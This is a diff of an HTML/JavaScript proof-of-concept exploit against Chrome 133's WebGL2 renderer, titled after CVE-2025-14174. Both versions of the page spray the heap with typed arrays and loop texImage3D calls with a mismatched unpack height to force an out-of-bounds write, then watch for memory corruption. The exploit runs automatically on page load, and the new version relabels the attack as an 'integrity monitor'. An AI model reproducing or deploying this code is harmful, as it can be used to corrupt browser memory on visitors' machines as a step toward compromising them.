@@ -1,83 +1,61 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Technical Research: Memory Primitive Analysis (v133)</title>
+    <title>Integrity Research: CVE-2025-14174 (v133)</title>
     <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 25px; }
-        #terminal { border: 1px solid #00ff00; padding: 20px; box-shadow: 0 0 20px #004400; }
-        .danger { color: #ff0000; font-weight: bold; }
+        body { background: #000; color: #00ff00; font-family: monospace; padding: 25px; }
+        #terminal { border: 1px solid #00ff00; padding: 20px; height: 500px; overflow-y: scroll; }
+        .hit { color: #ff0000; font-weight: bold; background: #330000; }
         .info { color: #00d4ff; }
     </style>
 </head>
 <body>
-    <h2>Advanced Renderer Analysis: Chrome 133.x</h2>
-    <div id="terminal">System Ready. Awaiting Sequence Start...<br></div>
+    <h2>Advanced Integrity Monitor: Chrome 133.x</h2>
+    <div id="terminal">Waiting for trigger...<br></div>
 
     <script>
         const term = document.getElementById('terminal');
-        const write = (msg) => term.innerHTML += `> ${msg}<br>`;
+        const write = (msg) => {
+            term.innerHTML += `> ${msg}<br>`;
+            term.scrollTop = term.scrollHeight;
+        };
 
-        async function executeAdvancedChain() {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl2');
+        async function monitorMemory() {
+            const gl = document.createElement('canvas').getContext('webgl2');
             
-            if (!gl) { write("CRITICAL ERROR: WebGL2 Context Lost."); return; }
-
-            write("<span class='info'>Phase 1: Structured Heap Spraying...</span>");
-            
-            // 1. STRUCTURED HEAP SPRAY
-            // We create 2000 small typed arrays to "groom" the memory.
-            // This ensures that when the overflow happens, it has a target to hit.
+            write("<span class='info'>[1] Initializing Integrity Spray...</span>");
             const spray = [];
-            for (let i = 0; i < 2000; i++) {
-                let arr = new Float64Array(1024);
-                arr.fill(1.1); // Fill with a unique bit pattern
+            for (let i = 0; i < 5000; i++) {
+                let arr = new Float64Array(128);
+                arr.fill(1.1); // Our "Safe" value
                 spray.push(arr);
             }
 
-            write("<span class='info'>Phase 2: Graphics Memory Grooming...</span>");
-            const texHeap = [];
-            for (let i = 0; i < 200; i++) {
-                let t = gl.createTexture();
-                gl.bindTexture(gl.TEXTURE_2D, t);
-                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA8, 128, 128, 0, gl.RGBA, gl.UNSIGNED_BYTE, new Uint8Array(128*128*4));
-                texHeap.push(t);
-            }
+            write("<span class='info'>[2] Starting High-Pressure Collision...</span>");
 
-            // 2. THE COLLISION TRIGGER
-            // We use a specific dimension (8192) that often triggers 
-            // 'integer truncation' in older ANGLE versions.
-            const fakeHeight = 1;
-            const targetHeight = 8192; 
-            const blob = new Uint8Array(targetHeight * 4).fill(0x41);
-
-            write("<span class='danger'>Phase 3: Executing High-Pressure Collision...</span>");
-
-            // We use requestAnimationFrame to sync with the GPU's refresh cycle
-            function trigger() {
-                for (let i = 0; i < 50; i++) {
-                    gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, fakeHeight);
-                    const crashTex = gl.createTexture();
-                    gl.bindTexture(gl.TEXTURE_3D, crashTex);
-
-                    // Attempt to force an out-of-bounds write into the sprayed heap
-                    gl.texImage3D(
-                        gl.TEXTURE_3D, 0, gl.RGBA8, 
-                        1024, targetHeight, 1, 
-                        0, gl.RGBA, gl.UNSIGNED_BYTE, 
-                        blob
-                    );
+            function checkIntegrity() {
+                // Check if any value in our spray has been "scribbled" on
+                for (let i = 0; i < spray.length; i++) {
+                    if (spray[i][0] !== 1.1) {
+                        write("<span class='hit'>[!!!] MEMORY CORRUPTION DETECTED at Index " + i + "</span>");
+                        write("New Value: " + spray[i][0]);
+                        return; // Success found
+                    }
                 }
-                write("Stream Loop Active. Monitoring for Memory Corruption...");
-                requestAnimationFrame(trigger);
+
+                // Execute the Mismatch Trigger
+                gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, 1);
+                const tex = gl.createTexture();
+                gl.bindTexture(gl.TEXTURE_3D, tex);
+                gl.texImage3D(gl.TEXTURE_3D, 0, gl.RGBA8, 1024, 8192, 1, 0, gl.RGBA, gl.UNSIGNED_BYTE, new Uint8Array(8192 * 4).fill(0x41));
+                
+                requestAnimationFrame(checkIntegrity);
             }
 
-            trigger();
+            checkIntegrity();
         }
 
-        window.onload = () => {
-            setTimeout(executeAdvancedChain, 2000);
-        };
+        window.onload = monitorMemory;
     </script>
 </body>
 </html>
